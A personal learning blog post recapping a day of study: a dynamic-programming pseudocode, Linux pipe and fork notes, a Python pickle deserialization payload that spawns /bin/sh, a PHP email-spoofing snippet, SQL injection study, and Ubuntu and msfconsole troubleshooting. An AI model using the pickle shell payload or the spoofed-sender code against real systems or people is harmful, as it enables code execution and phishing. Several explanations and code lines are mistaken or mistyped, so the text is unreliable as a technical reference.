---
layout: splash
title: "A Great Day"
classes:
  - landing
  - dark-theme
  - wide
---

# 4-10-2019 12:44 AM

I learned so much stuff on my own today. Unfortunately, I know this means I'll be disappointed tomorrow when I can't reach what I did today. Nevertheless, I had the most intense hour learning OS concepts and enjoyed some great moments. Let me recap.

Let's begin with a dynamic programming question. Given a grid of 0's and 1's, what's the area of the largest square of 1's? The algorithm is pretty clever. Here's the psuedo-code.

	dp(param):
		char[][] param
		char[param.rows + 1][param.cols + 1] master = 0's
		best = 0
		
		for i = 1, i <= rows, i++
			for j = 1, j <= cols, j++
				if param[i - 1][j - 1] == '1'
					master[i][j] = min(master[i - 1][j], master[i - 1][j - 1], master[i][j - 1])
					best = max(master[i][j], best)
		
		return best


Next, I learned about the Linux file system. A process is a dynamic program that runs in your computer. It's represented by a file descriptor, an int, which can be listed in a master table in the kernel. In C, if you want to create a pipe, you need to create an `int fd[2]` array. `fd[0]` reads and `fd[1]` writes. So if we (the parent process) want to read data from a child process, parent process closes `fd[1]` and child process closes `fd[0]`. A child process is created by forking, where it duplicates the parent process and uses execve to modify the new process. This is similar to forking on GitHub. I know that I may have some misconceptions so I will definitely review this later!

Afterwards, I learned about Python's pickles, which is the base64 to strings except for binary files. This, however, means it is vulnerable to command injections. Take this:

	import _pickle
	import subprocess
	from base64 import b64encode

	class RunBinSh(object):
		def __reduce__(self):
			return (subProcess.Popen, (('/bin/sh', ), ))

	print(b64encode(_pickle.dumps(RunBinSh())))

This is a valid string. I get the gist of this program but I need to figure out why there are so many commas in that return statement.

I also took a peek at `php` e-mail spoofing program. I need to digest how an e-mail server works sometime, and test out this psuedo-code.

	<?php
		$to = you@gmail.com;
		$subject = '';
		$message = 'hi';
		$headers = array(
			'From: spoof@gmail.com',
			'Reply-To: realemail@gmail.com'
		);
		mail($to, $subject, $message, $headers);
	?>

Then, I stumbled upon a blind-based SQL injection, and realized that I should probably be more familiar with SQL before trying to do SQL injections (even though they are the first things that are taught in cybersecurity). So I just learned more mySQL.

I realized that in query-languages, there doesn't exist `==`. You have to circumvent this by using `is` or `=`. The `IF(a, b, c)` condition works like this: if `a` (a boolean) is true, return `b`, else return `c`. `UNION` joins together two separate tables of queries (need more practice with this). `LOCATE(a, b)` is like `b.find(a)` in Python: find string `a` in string `b`.

Finally, I debugged my Ubuntu machine. For some odd reason, after I logged in, Ubuntu would return me back to the login page. On the login page, you can access the terminal via `ctrl-alt-f3`, and then I fixed a Samba error by

	sudo apt-get remove-purge samba samba-*
	sudo apt_get autoremove
	sudo apt-get install samba

Then, I re-escalated my privileges by modifying the `$USER` environmental variable:

	sudo chown -R $USER:$USER $HOME

I got back to the log-in page via `ctrl-alt-f1`.

Currently, I'm in the process of fixing my `msfconsole`. There was a Port 7337 error, which I fixed by finding `etc/postgresql` and changing the port in the config file. But for some reason, `msfconsole` won't connect to its database. I'm saving that for a later fight.